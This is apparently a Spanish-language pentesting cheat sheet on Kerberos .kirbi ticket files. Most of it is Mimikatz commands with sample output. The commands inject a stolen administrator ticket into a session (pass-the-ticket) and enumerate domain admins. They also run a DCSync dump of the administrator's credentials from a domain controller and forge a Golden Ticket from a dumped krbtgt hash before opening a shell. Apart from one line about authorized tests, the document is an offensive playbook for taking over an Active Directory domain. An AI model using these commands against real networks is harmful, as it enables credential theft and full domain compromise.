# Archivos .Kirbi

Tags: #Windows #Kirbi 

Archivo que suele contener un _ticket Kerberos_ en un formato usado por herramientas de seguridad de Windows. Puede servir para analizar o usar ese ticket en pruebas autorizadas. Trátalo como una credencial secreta.

## Mimikatz - Inyectar archivo (.Kirbi) a la sesión 
```bash 
192.168.107.175      DC01.LAINOSCP.local         LAINOSCP.local        DC01
       │                    │                         │                 │
       │                    │                         │                 └─ Hostname
       │                    │                         └─ Dominio DNS
       │                    └─ FQDN del equipo
       └─ IP

❯ net group "Domain Admins" /domain  # Mirar administradores del dominio 
❯ nltest /dclist:LAINOSCP.local 
```

```powershell 
# Si existe un ticket ya creado 'administrator.kirbi' se puede importar a la sesión 
Paso 1:
❯ C:\Temp\mimikatz.exe "kerberos::ptt administrator.kirbi" "exit"
❯ klist   # Mirar si se importo 

#0>	Client: Administrator @ LAINOSCP.LOCAL
	Server: krbtgt/LAINOSCP.local @ LAINOSCP.LOCAL
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 10/10/2026 14:55:07 (local)
	End Time:   10/11/2026 0:55:07 (local)
	Renew Time: 10/17/2026 14:55:07 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 


Paso 2:
EJEMPLO: DCSync
❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:<Dominio DNS> /dc:<FQDN del equipo> /user:<NetBIOS>\administrator" "exit" 

# Hacer un DCSync 
❯ C:\Temp\mimikatz.exe "lsadump::dcsync /domain:LAINOSCP.local /dc:DC01.LAINOSCP.local /user:lainoscp\administrator" "exit"   
```

## Golden Ticket 
```powershell 
❯ .\mimikatz.exe          # Ejecutar Mimikatz 

	privilege::debug      
	lsadump::lsa /patch   # Dumpear los hashes (krbtgt)
	kerberos::golden /user:administrator /domain:controller.local /sid:S-1-5-21-849420856-2351964222-986696166 /krbtgt:5508500012cc005cf7082a9a89ebdfdf /id:500 # Importar el ticket 
	misc::cmd # Ejecutar una shell con el ticket importado 
```